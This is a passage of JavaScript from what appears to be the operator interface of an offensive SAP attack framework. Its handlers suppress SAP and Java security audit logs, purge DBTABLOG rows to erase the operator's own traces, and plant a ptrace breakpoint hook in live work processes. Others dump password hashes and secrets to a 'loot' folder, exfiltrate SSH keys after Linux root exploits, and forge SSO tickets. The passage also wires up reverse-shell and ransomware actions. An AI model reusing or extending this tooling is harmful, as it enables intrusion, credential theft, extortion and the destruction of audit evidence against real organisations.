      } catch (e) { /* fall through with empty baseline */ }
      let promptText, defaultVal;
      if (isCompound) {
        // gw/logging is a structured compound: ACTION=<flags>
        // LOGFILE=<name> SWITCHTF=<rotate> MAXSIZEKB=<size>.  Sending
        // bare '0' returns SHMPRF_ERROR.  Suggest the baseline with
        // ACTION cleared as the silence default; let operator edit.
        const silenced = baseline
          ? baseline.replace(/ACTION=\S*/, 'ACTION=')
          : 'ACTION= LOGFILE=gw_log-%y-%m-%d SWITCHTF=day MAXSIZEKB=300';
        promptText =
          'Tier 3: set ' + param + ' on ' + sid + ' to which value?\n\n'
          + 'gw/logging is a COMPOUND parameter — the kernel rejects '
          + 'bare integers (SHMPRF_ERROR).\n\n'
          + 'Format: ACTION=<flags> LOGFILE=<name> SWITCHTF=<rotate> '
          + 'MAXSIZEKB=<size>\n\n'
          + 'To silence: clear ACTION= (the suggested default below '
          + 'already does this).\n\n'
          + (baseline
              ? 'Baseline (current value, will auto-restore on exit):\n  '
                  + baseline + '\n\n'
              : '⚠  No baseline value captured — verify the structure '
                + 'before submitting.\n\n')
          + 'Suggested silence value:';
        defaultVal = silenced;
      } else {
        // rdisp/TRACE is a simple integer (0-3).
        promptText =
          'Tier 3: set ' + param + ' on ' + sid + ' to which value?\n\n'
          + 'Common choices:\n'
          + '  • 0   — silence dispatcher trace (typical evasion target)\n'
          + '  • 1   — minimum logging\n'
          + '  • 2   — default on most installs\n'
          + '  • 3   — verbose\n\n'
          + (baseline
              ? 'Baseline (current value, will auto-restore on exit): '
                  + baseline + '\n\n'
              : '')
          + 'New value:';
        defaultVal = '0';
      }
      const valRaw = prompt(promptText, defaultVal);
      if (valRaw === null) break;
      const val = valRaw.trim();
      if (!val) {
        showToast('Value required', 'warning');
        break;
      }
      const holdRaw = prompt(
        'Hold ' + param + '=' + val + ' for how many seconds?\n\n'
        + 'During the hold the runtime value stays mutated so you '
        + 'can verify it in RZ11 / SM50.  After the hold expires '
        + 'the baseline value is restored.\n\n'
        + '0 = no hold (restore fires within milliseconds — useful '
        + 'only for scripted runs)',
        '30');
      if (holdRaw === null) break;
      const hold = parseFloat(holdRaw);
      if (isNaN(hold) || hold < 0 || hold > 600) {
        showToast('Hold seconds must be a number between 0 and 600',
                   'warning');
        break;
      }
      if (!confirm(
        'RUN Tier 3 ' + human + ' suppress on ' + sid + '?\n\n'
        + 'Writer: TH_CHANGE_PARAMETER (CHECK_PARAMETER=1)\n'
        + 'Param:  ' + param + '\n'
        + 'Value:  ' + val + '\n'
        + 'Hold:   ' + hold + 's\n\n'
        + 'Shared-memory only — no profile-file rewrite, no '
        + 'kernel restart.  Baseline auto-restored after the hold '
        + '(or on exception).\n\n'
        + 'A verify-read fires immediately after the writer call so '
        + 'silent-no-op kernel rejections are surfaced.')) break;
      flashActivity(
        `${sid}: Tier 3 — setting ${param}=${val} (hold ${hold}s)...`,
        5000);
      await api('POST', `node/${sid}/tier3_set_param`,
                 {param: param, value: val, hold_seconds: hold});
      // Live countdown so the operator knows when restore will fire
      if (hold > 0) {
        let pRemaining = Math.ceil(hold);
        const pKey = '_param_cd_' + sid + ':' + param;
        activeTasks[pKey] =
          '\u{1F6A8} ' + param + '=' + val + ' — ' + pRemaining + 's';
        updateActivityBar();
        const pTimer = setInterval(() => {
          pRemaining--;
          if (pRemaining > 0) {
            activeTasks[pKey] =
              '\u{1F6A8} ' + param + '=' + val + ' — ' + pRemaining + 's';
          } else if (pRemaining === 0) {
            activeTasks[pKey] =
              '\u{2705} ' + param + ' — restoring baseline...';
          } else {
            delete activeTasks[pKey];
            clearInterval(pTimer);
          }
          updateActivityBar();
        }, 1000);
      }
      break;
    }
    case 'tier3_sal_uname_narrow': {
      const slotno = prompt(
        'Tier 3: narrow which SAL slot(s) on ' + sid + '?\n\n'
        + 'Accepted forms:\n'
        + '  • single slot:    1   (or 0001)\n'
        + '  • multiple slots: 1,2,3\n'
        + '  • everything currently active: ALL\n\n'
        + 'The slot stays STATUS=\'X\' (active in SM19) but its '
        + 'UNAME filter gets swapped so SAPMAP00 no longer matches.',
        '1');
      if (!slotno) break;
      const replacement = prompt(
        'Replace UNAME with which value?\n\n'
        + 'Common choices:\n'
        + '  • your real operator user (e.g. JORIS, BASIS)\n'
        + '  • a wildcard that excludes SAPMAP00 (e.g. A*)\n'
        + '  • a sentinel that matches nothing (e.g. NEVER)\n\n'
        + 'The slot will only record events where the user matches '
        + 'this pattern.  Baseline UNAME auto-restored on exit.',
        '');
      if (!replacement) break;
      const holdRaw = prompt(
        'Hold UNAME swap for how many seconds before auto-restore?',
        '5');
      if (!holdRaw) break;
      const hold = parseFloat(holdRaw);
      if (isNaN(hold) || hold < 0 || hold > 600) {
        showToast('Hold seconds must be a number between 0 and 600',
                   'warning');
        break;
      }
      if (!confirm(
        'RUN Tier 3 SAL UNAME narrow on ' + sid + '?\n\n'
        + 'Slot(s):       ' + slotno + '\n'
        + 'New UNAME:     ' + replacement + '\n'
        + 'Hold:          ' + hold + 's\n\n'
        + 'Writer: RSAU_UPD_AUDIT_CONFIG (shared-memory only — '
        + 'no disk persistence, no SM19 header change).\n\n'
        + 'Slot STATUS stays X (still appears active in SM19) but '
        + 'no longer matches SAPMAP00.')) break;
      flashActivity(
        `${sid}: Tier 3 — swapping SAL UNAME...`, 5000);
      await api('POST', `node/${sid}/tier3_sal_uname_narrow`,
                 {slotno: slotno,
                  replacement_uname: replacement,
                  hold_seconds: hold});
      let unRemaining = Math.ceil(hold);
      const ukey = '_uname_cd_' + sid;
      activeTasks[ukey] =
        '\u{1F977} SAL slot(s) ' + slotno + ' UNAME→'
        + replacement + ' — ' + unRemaining + 's';
      updateActivityBar();
      const ucdTimer = setInterval(() => {
        unRemaining--;
        if (unRemaining > 0) {
          activeTasks[ukey] =
            '\u{1F977} SAL slot(s) ' + slotno + ' UNAME→'
            + replacement + ' — ' + unRemaining + 's';
        } else if (unRemaining === 0) {
          activeTasks[ukey] =
            '\u{2705} SAL slot(s) ' + slotno + ' — restoring UNAME...';
        } else {
          delete activeTasks[ukey];
          clearInterval(ucdTimer);
        }
        updateActivityBar();
      }, 1000);
      break;
    }
    case 'tier3_java_sal_suppress': {
      const jHoldRaw = prompt(
        'Tier 3: Suppress Java Security Audit Log on ' + sid + '\n\n'
        + 'This deploys a LogController JSP that sets all 6 Java SAL\n'
        + 'categories to Severity.NONE via Category.setEffectiveSeverity().\n\n'
        + 'Categories suppressed:\n'
        + '  • /System/Security/Audit (parent)\n'
        + '  • /System/Security/Audit/ACLs\n'
        + '  • /System/Security/Audit/Configuration\n'
        + '  • /System/Security/Audit/PermissionCheck\n'
        + '  • /System/Security/Audit/PrincipalModification\n'
        + '  • /System/Security/Audit/UserMapping\n\n'
        + 'Changes are runtime-only (JVM heap — no config file, no NWA\n'
        + 'change-log entry). Auto-restores after the hold window.\n\n'
        + 'Hold for how many seconds before auto-restore?',
        '30');
      if (!jHoldRaw) break;
      const jHold = parseFloat(jHoldRaw);
      if (isNaN(jHold) || jHold < 0 || jHold > 600) {
        showToast('Hold seconds must be 0–600', 'warning');
        break;
      }
      if (!confirm(
        'RUN Tier 3 Java SAL suppress on ' + sid + '?\n\n'
        + 'Hold:     ' + jHold + 's\n'
        + 'Writer:   Category.setEffectiveSeverity(Severity.NONE)\n'
        + 'Scope:    6 Java SAL categories\n'
        + 'Persist:  runtime-only (JVM heap)\n'
        + 'Restore:  automatic after hold window\n\n'
        + 'A LogController JSP will be deployed via the available\n'
        + 'deployment path (CVE-2025-31324, CTC, telnet, or GW).')) break;
      flashActivity(
        `${sid}: Tier 3 — suppressing Java SAL...`, 5000);
      await api('POST', `node/${sid}/tier3_java_sal_suppress`,
                 {hold_seconds: jHold});
      let jRemaining = Math.ceil(jHold);
      const jKey = '_java_sal_cd_' + sid;
      activeTasks[jKey] =
        '\u{1F6AB} Java SAL suppressed — ' + jRemaining + 's';
      updateActivityBar();
      const jcdTimer = setInterval(() => {
        jRemaining--;
        if (jRemaining > 0) {
          activeTasks[jKey] =
            '\u{1F6AB} Java SAL suppressed — ' + jRemaining + 's';
        } else if (jRemaining === 0) {
          activeTasks[jKey] =
            '\u{2705} Java SAL — restoring baseline...';
        } else {
          delete activeTasks[jKey];
          clearInterval(jcdTimer);
        }
        updateActivityBar();
      }, 1000);
      break;
    }
    case 'tier3_dbtablog_purge': {
      const dHoldRaw = prompt(
        'Tier 3: Purge DBTABLOG on ' + sid + '\n\n'
        + 'This captures MAX(LOGID) as a baseline, waits N seconds\n'
        + 'while you run actions that would normally land in DBTABLOG,\n'
        + 'then DELETEs every row with LOGID > baseline.\n\n'
        + 'DBTABLOG is delivery-class L (not itself logged), so the\n'
        + 'DELETE does not recurse. No DD09L touch, no DDIC change.\n\n'
        + 'Hold for how many seconds before purge?',
        '30');
      if (!dHoldRaw) break;
      const dHold = parseFloat(dHoldRaw);
      if (isNaN(dHold) || dHold < 0 || dHold > 3600) {
        showToast('Hold seconds must be 0–3600', 'warning');
        break;
      }
      const dTabsRaw = prompt(
        'TABNAME whitelist (comma-separated, e.g. USR02,USR04,T000)\n\n'
        + 'Leave EMPTY to purge ALL tables since baseline (recommended\n'
        + 'unless you know exactly which tables your action touched).',
        '');
      // Null = cancelled, empty string = "purge all" — keep cancel-vs-empty distinct.
      if (dTabsRaw === null) break;
      const dTabs = dTabsRaw.split(',').map(s => s.trim().toUpperCase())
                            .filter(Boolean);
      const dScope = dTabs.length
        ? 'TABNAME IN (' + dTabs.join(', ') + ')'
        : 'ALL tables';
      if (!confirm(
        'RUN Tier 3 DBTABLOG purge on ' + sid + '?\n\n'
        + 'Hold:     ' + dHold + 's\n'
        + 'Scope:    ' + dScope + '\n'
        + 'Writer:   RFC_ABAP_INSTALL_AND_RUN (throwaway DELETE program)\n'
        + 'Persist:  one-shot DELETE — no state to restore\n\n'
        + 'During the hold window, perform the action whose audit you\n'
        + 'want erased — it will hit DBTABLOG normally, then be purged.')) break;
      flashActivity(
        `${sid}: Tier 3 — DBTABLOG baseline + ${dHold}s hold...`, 5000);
      await api('POST', `node/${sid}/tier3_dbtablog_purge`,
                 {hold_seconds: dHold, tabname_filter: dTabs});
      let dRemaining = Math.ceil(dHold);
      const dKey = '_dbtablog_cd_' + sid;
      activeTasks[dKey] =
        '\u{1F9F9} DBTABLOG baseline set — ' + dRemaining + 's hold';
      updateActivityBar();
      const dcdTimer = setInterval(() => {
        dRemaining--;
        if (dRemaining > 0) {
          activeTasks[dKey] =
            '\u{1F9F9} DBTABLOG baseline set — ' + dRemaining + 's hold';
        } else if (dRemaining === 0) {
          activeTasks[dKey] =
            '\u{1F525} DBTABLOG — purging rows since baseline...';
        } else {
          delete activeTasks[dKey];
          clearInterval(dcdTimer);
        }
        updateActivityBar();
      }, 1000);
      break;
    }
    case 'tier3_sal_death_star_launch': {
      // Virtual SAP Death Star — Julian Petersohn's ptrace-based
      // in-memory SAL suppressor.  Two-step confirm because this
      // *plants INT3 bytes into the live disp+work text segment*.
      // A crash before the paired disarm would leave breakpoints
      // patched into the running kernel — the SIGTERM handler
      // restores cleanly, SIGKILL doesn't.
      const dsFilterRaw = prompt(
        'Tier 3: Arm Virtual SAP Death Star on ' + sid + '\n\n'
        + 'This uploads Julian Petersohn\'s sap_audit_hook.c to /tmp\n'
        + 'on the target, compiles as <sid>adm, picks a disp+work\n'
        + 'worker PID, and ptrace-attaches. INT3 breakpoints go into\n'
        + 'the three SAL sinks (fwrite×2 + write_event_to_DB + ETD).\n'
        + '\n'
        + 'Suppress filter — comma-separated event classes to drop.\n'
        + '  Empty  = suppress EVERYTHING the hook sees\n'
        + '  AUW    = only successful logons\n'
        + '  AUW,AU3,EUP = several classes\n'
        + '\n'
        + 'Requires: Linux + <sid>adm shell + ptrace_scope <= 1',
        'AUW');
      // Null = cancelled; empty string = "suppress all".
      if (dsFilterRaw === null) break;
      const dsFilter = dsFilterRaw.trim();
      const dsPidRaw = prompt(
        'Target work-process PID?\n\n'
        + 'Leave EMPTY (RECOMMENDED) to attach to ALL disp+work\n'
        + 'processes — the C hook walks /proc itself and hooks every\n'
        + 'worker (dialog, batch, spool, update). This is what you\n'
        + 'want because SAP round-robins dialog sessions across the\n'
        + 'whole worker pool; hooking only one worker leaves audit\n'
        + 'events on the others still landing in SM20.\n\n'
        + 'Or paste a single PID (from ps -eo pid,comm on the target)\n'
        + 'to hook only that specific disp+work process — useful for\n'
        + 'debugging or targeting a known logon session.',
        '');
      if (dsPidRaw === null) break;
      const dsPid = dsPidRaw.trim() ? parseInt(dsPidRaw, 10) : null;
      if (dsPidRaw.trim() && (isNaN(dsPid) || dsPid <= 0)) {
        showToast('PID must be a positive integer', 'warning');
        break;
      }
      if (!confirm(
        'ARM the Virtual SAP Death Star on ' + sid + '?\n\n'
        + 'Filter:   ' + (dsFilter || '(all SAL classes)') + '\n'
        + 'Target:   ' + (dsPid ? 'PID ' + dsPid + ' only' : 'ALL disp+work workers (auto)') + '\n'
        + 'Method:   ptrace INT3 hook in disp+work rsauwr1ex\n'
        + 'Persist:  background process on target until Disarm\n'
        + '\n'
        + '⚠ INT3 bytes are planted into live disp+work code. If the\n'
        + '  hook is SIGKILL\'d instead of SIGTERM\'d, the bytes stay\n'
        + '  patched and the work process will trap on next SAL write.\n'
        + '  Use the Disarm action to stop cleanly.')) break;
      flashActivity(
        `${sid}: Death Star — uploading + compiling + arming...`,
        6000);
      await api('POST', `node/${sid}/tier3_sal_death_star_launch`,
                 {filter_classes: dsFilter,
                  target_pid: dsPid});
      break;
    }
    case 'tier3_sal_death_star_stop':
      // Disarm — SIGTERM the hook.  No confirm; disarm is always
      // safe (idempotent), and the whole point of the button is
      // quick cleanup.
      flashActivity(
        `${sid}: Death Star — disarming (SIGTERM + INT3 restore)...`,
        4000);
      await api('POST', `node/${sid}/tier3_sal_death_star_stop`);
      break;
    case 'retrieve_rfcs':
      await api('POST', `node/${sid}/retrieve_rfcs`); break;
    case 'test_rfcs':
      if (!confirm('Test RFC destinations on ' + sid + '?\n\n' +
                   '⚠ Warning: if a destination holds a wrong password for a ' +
                   'real user, this may lock that user on the target system.')) break;
      await api('POST', `node/${sid}/test_rfcs`); break;
    case 'download_hashes': {
      const nh = (mapState.nodes || {})[sid];
      const sysT = (nh && nh.system_type || '').toUpperCase();
      const isJavaOnly = sysT.indexOf('JAVA') !== -1 && sysT.indexOf('ABAP') === -1;
      if (isJavaOnly) {
        if (!confirm('Extract Java password material?\n\n' +
                      'Pulls UME_STRINGS j_user/j_password pairs (UME hashes) ' +
                      'AND J2EE_CONFIGENTRY password-like rows (cleartext after ' +
                      'SecStoreFS decryption).  Output saved to loot/ as ' +
                      'hashes_java_<SID>_<ts>.txt.')) break;
        await api('POST', `node/${sid}/extract_java_hashes`);
      } else {
        await api('POST', `node/${sid}/download_hashes`);
      }
      break;
    }
    case 'download_secstore':
      await api('POST', `node/${sid}/download_secstore`); break;
    case 'tms_discover':
      await runTMSDiscover(sid); break;
    case 'download_table': {
      const nt = (mapState.nodes || {})[sid];
      const sysTt = (nt && nt.system_type || '').toUpperCase();
      const isJavaOnly2 = sysTt.indexOf('JAVA') !== -1 && sysTt.indexOf('ABAP') === -1;
      if (isJavaOnly2) {
        const tbl = prompt('Java DB table to download (e.g. UME_STRINGS, J2EE_CONFIGENTRY, J2EE_CONFIG_DEPLOY):', 'UME_STRINGS');
        if (!tbl || !tbl.trim()) break;
        const flds = prompt('Fields (comma-separated, leave blank or "*" for all):', '*');
        if (flds === null) break;
        const where = prompt('Optional WHERE clause (without "WHERE"):', '');
        if (where === null) break;
        const max = prompt('Max rows:', '500');
        if (max === null) break;
        await api('POST', `node/${sid}/download_java_table`, {
          table:    tbl.trim(),
          fields:   (flds || '*').trim(),
          where:    (where || '').trim(),
          max_rows: parseInt(max, 10) || 500,
        });
      } else {
        document.getElementById('table-modal').classList.add('visible');
      }
      break;
    }
    case 'impact_assess': {
      const n_ia = (mapState.nodes || {})[sid];
      // Collect all unique clients from credentials + created users
      const credClients = new Set();
      for (const c of (n_ia && n_ia.credentials || [])) {
        if (c.client) credClients.add(c.client);
      }
      for (const u of (n_ia && n_ia.created_users || [])) {
        if (u.client) credClients.add(u.client);
      }
      const clientList = [...credClients].sort();
      let chosenClient = null;
      if (clientList.length > 1) {
        const defClient = clientList.find(c => c !== '000') || clientList[0];
        const chosen = prompt(
          `Run business impact scenarios in which client?\n\n` +
          `Available clients with credentials: ${clientList.join(', ')}\n\n` +
          `(Business data like sales orders, HR data, etc. is typically in client 001+)`,
          defClient
        );
        if (chosen === null) break;
        chosenClient = chosen.trim();
      }
      const payload = chosenClient ? { client: chosenClient } : {};
      await api('POST', `node/${sid}/impact/assess`, payload);
      break;
    }
    case 'impact_view':
      showImpactDetail(sid); break;
    case 'impact_assess_java':
      await api('POST', `node/${sid}/impact_assess_java`); break;
    case 'ransapware_encrypt':
      showRansapwareModal(sid); break;
    case 'ransapware_decrypt':
      showRansapwareDecryptModal(sid); break;
    case 'os_terminal': showTerminalModal(sid); break;
    case 'file_browser': showFileBrowserModal(sid); break;
    case 'reverse_shell': showShellModal(sid); break;
    case 'import_transport': showImportTransportModal(sid); break;
    case 'tms_propagate':    showTMSPropagateModal(sid); break;
    case 'create_tcpip': showTcpipModal(sid); break;
    case 'propagate': showPropagateModal(sid); break;
    case 'harvest_btp_creds': await showHarvestBtpCredsModal(sid); break;
    case 'cleanup':
      if (confirm(`Delete SAPMAP00 user from ${sid}?`))
        await api('POST', `node/${sid}/cleanup`);
      break;
    case 'client_roles':
      await api('POST', `node/${sid}/client_roles`); break;
    case 'read_usrextid':
      await api('POST', `node/${sid}/read_usrextid`);
      showToast('USREXTID read started — check findings drawer for PP impersonation surface', 'info');
      break;
    case 'verify_pp_impersonation': {
      const n2 = (mapState.nodes || {})[sid];
      const sccHost = (n2.scc_links || []).find(h => (mapState.scc_nodes || {})[h]) || '?';
      const sn2 = (mapState.scc_nodes || {})[sccHost] || {};
      const subUuid = (sn2.subaccount_uuids || [])[0] || '';
      const regions = mapState.btp_token_regions || [];
      const region = regions[0] || '<region>';
      const rule = ((sn2.pp_analysis || {}).pp_config || {}).subject_patterns;
      const ruleStr = rule && rule[0]
        ? ((rule[0].dn_entries || []).map(e => `${e.key}=${e.value}`).join(', '))
        : '(no rule)';
      const internalProxy =
        `connectivityproxy.internal.cf.${region}.hana.ondemand.com:20003`;
      let overrideActive = (mapState.btp_proxy_override || '').trim();

      // Foolproof first step: when no override is set, the probe is
      // almost certain to time out (the default internal hostname is
      // CF-internal).  Ask up-front, persist the answer server-side,
      // and skip the confirm dialog's default-proxy footgun.
      if (!overrideActive) {
        const v = prompt(
          'No BTP connectivity-proxy override is set.\n\n'
          + 'The PP probe drives an HTTP CONNECT through:\n'
          + '  ' + internalProxy + '\n'
          + 'That hostname is CF-internal — from a developer machine\n'
          + 'you almost always need a cf-ssh tunnel.  See\n'
          + 'tools/btp_ssh_bridge/README.md for the ready-made bridge\n'
          + 'app.  Typical local target after the tunnel is up:\n'
          + '  localhost:20003\n\n'
          + 'Enter host:port to use for this and every following probe\n'
          + '(persisted on the server for the session).  Or leave blank\n'
          + 'to fall back to the internal hostname (only viable when\n'
          + 'SAPMAP itself runs inside BTP\'s CF runtime).',
          'localhost:20003');
        if (v === null) break;
        const trimmed = (v || '').trim();
        if (trimmed) {
          const r = await fetch('/api/btp/proxy_override', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({proxy_host: trimmed}),
          }).then(r => r.json()).catch(() => null);
          if (r && r.ok) {
            overrideActive = trimmed;
            // Reflect locally so the next render picks it up without
            // waiting for the polling cycle.
            mapState.btp_proxy_override = trimmed;
            showToast('PP-probe proxy → ' + trimmed
                      + ' (saved for the session)',
                      {autoCloseMs: 4000});
          } else {
            alert('Failed to store override: ' + ((r && r.error) || '?'));
            break;
          }
        }
        // else: empty input means "use default anyway" — fall through
      }

      const proxyLine = overrideActive
        ? overrideActive + '  (override active — Settings → BTP Connectivity Proxy Override to change)'
        : internalProxy + '  (default; reachable only from inside BTP)';
      const msg = (
        'Send a LIVE principal-propagation impersonation probe?\n\n'
        + 'Source : cloud token for region ' + (regions.join(', ') || '(none)') + '\n'
        + 'Subacc : ' + (subUuid ? subUuid.slice(0, 8) + '…' : '(none)') + '\n'
        + 'Via SCC: ' + sccHost + '\n'
        + 'Target : ' + sid + '\n'
        + 'PP rule: ' + ruleStr + '\n'
        + 'Proxy  : ' + proxyLine + '\n\n'
        + 'The probe is READ-ONLY (GET /sap/bc/ping + whoami).\n'
        + 'Continue?');
      if (!confirm(msg)) break;
      await api('POST', `node/${sid}/verify_pp_impersonation`, {});
      const usingProxy = overrideActive || internalProxy;
      showToast('PP probe started via ' + usingProxy, 'info');
      break;
    }
    case 'set_type': showTypeModal(sid); break;
    case 'set_sid': showSidModal(sid); break;
    case 'set_db_type': showDbTypeModal(sid); break;
    case 'set_os_type': showOsTypeModal(sid); break;
    case 'set_instance_nr': showInstanceNrModal(sid); break;
    case 'check_router_info':
      await api('POST', `node/${sid}/check_router_info`); break;
    case 'check_snc':
      await api('POST', `node/${sid}/check_snc`); break;
    case 'router_scan': showRouterScanModal(sid); break;
    case 'enum_clients':
      await api('POST', `node/${sid}/enum_clients`); break;
    case 'default_creds':
      if (confirm('⚠️ WARNING: Checking default accounts may LOCK user accounts after failed login attempts.\n\nThis tests well-known SAP default credentials (SAP*, DDIC, TMSADM, etc.) via DIAG protocol.\n\nProceed?'))
        api('POST', `node/${sid}/check_default_creds`);
      break;
    case 'set_saprouter': showSaprouterModal(sid); break;
    case 'harvest_scc': {
      const nh = (mapState.nodes || {})[sid];
      const canHarvest = nh && (nh.gw_vulnerable || nh.cve_2025_31324_vulnerable);
      if (!canHarvest) {
        alert('Harvest SCC requires a pwned/vulnerable node (GW exploit or CVE-2025-31324).\n\nExploit the node first, then try again.');
        break;
      }
      if (!confirm('Harvest SCC from ' + sid + '?\n\n' +
                   'Runs ARP/host sweep, SSH-key hunt, and same-host SCC bundle ' +
                   'exfiltration on the pwned node.  May write files to /tmp on target.')) break;
      await api('POST', `node/${sid}/harvest_scc`);
      break;
    }
    case 'harvest_scc_mappings': {
      if (!confirm('Harvest SCC mappings from co-located SCC on ' + sid + ' via OS-exec?\n\nReads backends.xml directly from disk — no SCC admin credentials needed.')) break;
      await api('POST', `node/${sid}/harvest_scc_mappings`);
      console.log('[SCC] Mapping harvest started');
      break;
    }
    case 'harvest_scc_hashes_via_lpe': {
      const nh = (mapState.nodes || {})[sid];
      const lpeReady = nh && (nh.copyfail_vulnerable
                                || nh.dirtyfrag_vulnerable
                                || nh.peditcow_vulnerable
                                || nh.copyfail_root_obtained
                                || nh.dirtyfrag_root_obtained
                                || nh.peditcow_root_obtained);
      if (!lpeReady) {
        alert('Linux LPE is not flagged viable on ' + sid + '.\n\n'
              + 'Run "Check Linux Root LPE" first — Copy Fail, '
              + 'pedit-COW, or Dirty Frag must report a usable '
              + 'technique before the escalating harvest can proceed.');
        break;
      }
      if (!confirm('Escalate to root on ' + sid + ' via Linux LPE '
                   + '(Copy Fail / pedit-COW / Dirty Frag) and read '
                   + '/opt/sap/scc/config/users.xml + the rest of the '
                   + 'SCC config bundle?\n\n'
                   + 'This patches /usr/bin/su\'s page cache (memory-only) '
                   + 'and runs tar as uid=0. The unprivileged SCC '
                   + 'harvest paths (REST / sudo / group / /proc fd) '
                   + 'will be SKIPPED.\n\nContinue?')) break;
      {
        const startRes = await api('POST', `node/${sid}/harvest_scc_hashes_via_lpe`);
        const sccHost = startRes && startRes.scc_host;
        console.log('[SCC] LPE-escalating hash harvest started');
        if (sccHost) {
          const taskKey = `${sid}:harvest_scc_hashes_via_lpe`;
          const _poll = () => new Promise(resolve => {
            const iv = setInterval(async () => {
              await pollUpdates();
              if (!activeTasks[taskKey]) { clearInterval(iv); resolve(); }
            }, 3000);
          });
          _poll().then(() => {
            console.log('[SCC] LPE harvest done — opening hashes modal for', sccHost);
            sccDownloadHashes(sccHost);
          });
        }
      }
      break;
    }
    case 'harvest_scc_ssfs': {
      if (!confirm('Decrypt on-host SCC SSFS from ' + sid + ' via OS-exec?\n\n' +
                   'Reads SSFS_SCC.KEY + SSFS_SCC.DAT directly from disk.\n' +
                   'Recovers secrets such as JAVA_KEYSTORE_PASSWORD, PP CA key password.\n' +
                   '(The backup zip SSFS is double-encrypted and yields 0 secrets — this does not.)')) break;
      await api('POST', `node/${sid}/harvest_scc_ssfs`);
      console.log('[SCC] On-host SSFS decrypt started');
      break;
    }
    // ── Cloud Connector submenu actions (proxy to SCC functions) ──────
    // n is not in scope at the top switch level — resolve via sid.
    case 'scc_via_sap_set_credentials':
    case 'scc_via_sap_probe_creds':
    case 'scc_via_sap_pull_mappings':
    case 'scc_via_sap_probe_mappings':
    case 'scc_via_sap_extract_keystore':
    case 'scc_via_sap_download_hashes': {
      const _sapNode = (mapState.nodes || {})[sid];
      const _sccH = _sccHostForNode(_sapNode);
      if (!_sccH) { showToast('No SCC found on same host as ' + sid, 'warn'); break; }
      if (action === 'scc_via_sap_set_credentials')  showSCCCredModal(_sccH);
      if (action === 'scc_via_sap_probe_creds')       sccProbeCreds(_sccH);
      if (action === 'scc_via_sap_pull_mappings')     sccPullMappings(_sccH);
      if (action === 'scc_via_sap_probe_mappings')    sccProbeMappings(_sccH);
      if (action === 'scc_via_sap_extract_keystore')  sccExtractKeystore(_sccH);
      if (action === 'scc_via_sap_download_hashes')   sccDownloadHashes(_sccH);
      break;
    }
    case 'set_telnet_override': {
      const cur = n.telnet_override || '';
      const val = prompt(
        'Telnet-console endpoint for this node.\n\n' +
        'Use when the target binds admin telnet to 127.0.0.1 and you\n' +
        'have an SSH tunnel:\n' +
        '    ssh -L 50008:127.0.0.1:50008 user@target\n' +
        'Then set this to "127.0.0.1:50008".\n\n' +
        'Leave empty to clear and use the default 5NN08 on the node.',
        cur);
      if (val === null) break;
      await api('POST', `node/${sid}/set_telnet_override`,
                 { telnet_override: val.trim() });
      break;
    }
    case 'delete_system':
      if (confirm(`Delete ${sid} from the map? This removes the system and all its connections.`)) {
        const r = await api('DELETE', `node/${sid}`);
        if (r && r.error) { alert('Delete failed: ' + r.error); break; }
        // Immediately remove from local state and re-render
        delete mapState.nodes[sid];
        mapState.connections = (mapState.connections || []).filter(
          c => c.source_sid !== sid && c.target_sid !== sid);
        updateMap();
      }
      break;
    // ── MYSAPSSO2 ticket-forgery workflow ───────────────────────────
    // Note: the SSO2 profile pre-flight check runs implicitly
    // inside the forge orchestrator (step 2.5) — no standalone
    // menu entry.  Operators wanting an isolated check should use
    // ``python3 tools/check_sso2_profile.py`` from the CLI.
    case 'ssh_harvest':
      if (confirm(`Harvest SSH keys from ${sid}?\n\nThis reads /etc/passwd, enumerates .ssh directories, and exfiltrates private keys, known_hosts, authorized_keys, and SSH config files.\n\nResults are saved to loot/ssh/.`))
        await api('POST', `node/${sid}/ssh_harvest`);
      break;
    case 'ssh_harvest_root':
      if (confirm(`Harvest SSH keys from ${sid} as ROOT?\n\nThis uses the Linux LPE (Copy Fail / pedit-COW / Dirty Frag) to read ALL users' .ssh directories — not just the current sidadm user.\n\nResults are saved to loot/ssh/.`))
        await api('POST', `node/${sid}/ssh_harvest`, { channel: 'root' });
      break;
    case 'ssh_test_keys':
      showSshLateralModal(sid);
      break;
    // ssh_plant_key removed (out of scope)
    case 'forge_ticket':
      showForgeTicketModal(sid);
      break;
    case 'propagate_ticket':
      showPropagateTicketModal(sid);
      break;
    case 'discover_strustsso2':
      await api('POST', `node/${sid}/discover_strustsso2`);
      showToast(`STRUSTSSO2 discovery started on ${sid}`, 'info');
      break;
    case 'forge_and_fanout': {
      const user = prompt(
        'Forge & Fanout — impersonate user:\n\n' +
        'IMPORTANT: this user must EXIST and be UNLOCKED on every fanout target.\n' +
        'SAP* is often virtual/missing in customer clients (100, etc.) → 403.\n' +
        'DDIC always exists; a SAPMAP-created user is also safe.',
        'DDIC');
      if (!user) break;
      const client = prompt(
        'Target client (MANDT) — fallback only:\n\n' +
        'This is the TARGET system\'s client, not the source.\n' +
        'Used only when the target\'s actual client list is unknown.\n' +
        'When the target has enumerated clients (from prior scan), those win.',
        '001');
      if (!client) break;
      await api('POST', `node/${sid}/forge_and_fanout`,
                { user: user, client: client });
      showToast(`Forge & Fanout started on ${sid}`, 'info');
      break;
    }
  }
  startPolling();
}

// Tracks the per-modal live-poller so we never run more than one at
// a time and we cancel the old one when the operator clicks a
// different connection.
let _connInfoPollTimer = null;
let _connInfoLastKey = '';
let _connInfoCurrentIdx = -1;

function _connInfoStateKey(c) {
  if (!c) return '<missing>';
  return JSON.stringify({
    tested:           !!c.tested,
    logon_successful: !!c.logon_successful,
    has_sap_all:      !!c.has_sap_all,
    profiles_len:     (c.profiles || []).length,
    roles_len:        (c.roles || []).length,
    user_detail_err:  (c.user_detail_error || '').length,
    // Issue #23 — poll loop must re-render when the create-user
    // reach probe finishes (either the auto-probe on Test Connection
    // or the operator-triggered canary route).
    can_create_user:  c.can_create_user,
    create_user_probe: c.create_user_probe || '',
    create_user_probe_at: c.create_user_probe_at || '',
    create_user_probe_err_len: (c.create_user_probe_error || '').length,
    sapxpg_remote_works: !!c.sapxpg_remote_works,
    trusted_system:   !!c.trusted_system,
    ping_ok:          !!c.ping_ok,
    // Phase 3a: SOAP-RFC verification flips logon_successful AND
    // sets soap_rfc_verified — without this in the key, the open
    // modal sees logon_successful=true unchanged and never re-renders.
    soap_rfc_verified: !!c.soap_rfc_verified,
    has_secstore_pwd:  !!c.secstore_password,
    // Type-G additions — the "Test Connection" flow can flip these
    // (SAPControl auth OK → os_exec_verified, Java 401 → http_status,
    // ADS body marker → is_ads_dest / note_1177315_hit, classifier
